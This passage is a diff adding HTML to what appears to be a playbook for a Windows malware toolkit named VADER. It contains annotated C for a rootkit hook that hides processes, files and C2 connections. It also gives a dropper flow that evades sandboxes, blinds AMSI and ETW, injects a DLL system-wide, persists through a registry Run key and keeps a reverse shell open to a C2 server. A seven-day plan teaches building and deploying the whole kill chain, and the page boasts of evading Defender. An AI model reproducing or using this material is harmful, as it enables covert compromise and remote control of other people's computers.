+            <span class="anno">/* Hiding last entry — terminate list at prev */</span>
+            prev->NextEntryOffset = 0;
+        } <span class="kw">else</span> {
+            <span class="anno">/* Hiding middle entry — bridge over it */</span>
+            prev->NextEntryOffset += curr->NextEntryOffset;
+        }
+    }
+    <span class="kw">if</span> (curr->NextEntryOffset == 0) <span class="kw">break</span>;
+    prev = curr;
+    curr = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
+}
+
+<span class="anno">/* The inline hook itself — 12-byte absolute JMP patched into ntdll:
+   48 B8 [8-byte address]   mov rax, hook_function
+   FF E0                     jmp rax
+   Original bytes saved to a trampoline for calling the real function. */</span></div>
+    <div class="build-note">Same pattern for file hiding (NtQueryDirectoryFile — unlink FILE_BOTH_DIR_INFORMATION nodes) and connection hiding (NtDeviceIoControlFile — filter MIB_TCPROW entries matching C2 port). SetWindowsHookEx(WH_CBT) spreads cloak.dll system-wide automatically.</div>
+  </div>
+
+  <!-- LAYER 7: THE DROPPER -->
+  <div class="build-step">
+    <h3>THE DROPPER &mdash; Combining Everything</h3>
+    <p style="font-size:0.78rem;color:var(--text);margin-bottom:0.5rem;">vader_dropper.c chains all layers into one 268 KB single-click executable.</p>
+    <div class="code-annotated"><span class="cmt">// vader_dropper.c — WinMain execution flow</span>
+
+<span class="kw">int</span> WINAPI <span class="fn">WinMain</span>(...) {
+
+    <span class="anno">/* Phase 0: Anti-sandbox — skip if VM/analysis environment */</span>
+    <span class="kw">if</span> (<span class="fn">sandbox_check</span>()) <span class="kw">return</span> 0;
+    <span class="anno">// RAM &lt; 2GB? Single core? Sleep accelerated? → bail</span>
+
+    <span class="anno">/* Phase 0.5: Resolve APIs dynamically — avoid IAT signatures */</span>
+    <span class="fn">resolve_dynamic_imports</span>();
+    <span class="anno">// XOR-decode API names → LoadLibrary → GetProcAddress</span>
+    <span class="anno">// WSASocket, WSAConnect, SetWindowsHookExA, CreateProcessA...</span>
+
+    <span class="anno">/* Phase 1: Dark Room — blind AMSI + ETW */</span>
+    <span class="fn">activate_dark_room</span>();
+    <span class="anno">// VEH → DR0 on AmsiScanBuffer → DR1 on EtwEventWrite</span>
+
+    <span class="anno">/* Phase 2: Cloak — deploy concealment DLL */</span>
+    <span class="fn">deploy_cloak</span>();
+    <span class="anno">// XOR-decrypt embedded DLL → drop to %TEMP% → LoadLibrary</span>
+    <span class="anno">// CBT hook → DLL injected into every GUI process</span>
+    <span class="anno">// Process/file/connection hiding active system-wide</span>
+
+    <span class="anno">/* Phase 2.5: Persistence — survive reboot */</span>
+    <span class="fn">install_persistence</span>();
+    <span class="anno">// Self-copy to APPDATA + registry Run key</span>
+
+    <span class="anno">/* Phase 3: C2 — reverse shell with auto-reconnect */</span>
+    <span class="kw">while</span> (1) {
+        SOCKET ch = <span class="fn">connect_c2</span>(ip, port);
+        <span class="kw">if</span> (ch != INVALID_SOCKET) {
+            <span class="fn">interactive_loop</span>(ch);  <span class="anno">// shell + screenshot commands</span>
+            <span class="fn">closesocket</span>(ch);
+        }
+        <span class="fn">Sleep</span>(5000);            <span class="anno">// reconnect every 5 seconds</span>
+    }
+}</div>
+    <div class="build-note">BUILD: <code style="color:var(--green);">python cloak/build_cloak.py --scan</code> — compiles with MSVC, links ws2_32 + kernel32 + ntdll + user32 + advapi32 + gdi32, runs Defender scan. All 26 binaries across the toolkit scan CLEAN.</div>
+  </div>
+
+</div>
+
+<!-- ═══════ READING ORDER ═══════ -->
+<div class="section">
+  <h2>// READING ORDER &mdash; DAILY PATH</h2>
+  <p style="color:var(--muted);font-size:0.78rem;margin-bottom:1rem;">Start at Day 1. Each day builds on the last. By Day 7 you understand the entire kill chain.</p>
+  <table>
+    <tr><th>Day</th><th>Topic</th><th>Read</th><th>Build</th></tr>
+    <tr>
+      <td style="color:var(--amber);">1</td>
+      <td>TCP reverse shell fundamentals</td>
+      <td><a href="rootkit.html">VADER &mdash; Phase 1</a></td>
+      <td style="color:var(--muted);">Write a basic C socket + cmd.exe pipe</td>
+    </tr>
+    <tr>
+      <td style="color:var(--amber);">2</td>
+      <td>AMSI internals + hardware breakpoints</td>
+      <td><a href="rootkit.html">VADER &mdash; Dark Room</a></td>
+      <td style="color:var(--muted);">Implement VEH + DR0 on AmsiScanBuffer</td>
+    </tr>
+    <tr>
+      <td style="color:var(--amber);">3</td>
+      <td>Zero-width Unicode steganography</td>
+      <td><a href="ghost.html">Ghost Encoder</a></td>
+      <td style="color:var(--muted);">Encode/decode a test string with 16 invisible chars</td>
+    </tr>
+    <tr>
+      <td style="color:var(--amber);">4</td>
+      <td>Persistence mechanisms + XOR obfuscation</td>
+      <td><a href="rootkit.html">VADER &mdash; Persistence</a></td>
+      <td style="color:var(--muted);">Registry Run key + self-copy + string encryption</td>
+    </tr>
+    <tr>
+      <td style="color:var(--amber);">5</td>
+      <td>GDI screen capture + process injection</td>
+      <td><a href="rootkit.html">VADER &mdash; Phase 4</a></td>
+      <td style="color:var(--muted);">BitBlt screen grab + inject DLL into running process</td>
+    </tr>
+    <tr>
+      <td style="color:var(--amber);">6</td>
+      <td>Inline hooks + concealment (rootkit layer)</td>
+      <td><a href="sithstalker.html">Sith Stalker</a></td>
+      <td style="color:var(--muted);">Hook NtQuerySystemInformation + unlink process</td>
+    </tr>
+    <tr>
+      <td style="color:var(--amber);">7</td>
+      <td>Full kill chain integration + mutation</td>
+      <td><a href="dossier.html">This playbook</a></td>
+      <td style="color:var(--muted);">Compile dropper, deploy, test end-to-end</td>
+    </tr>
+  </table>
 </div>
 
 </div>
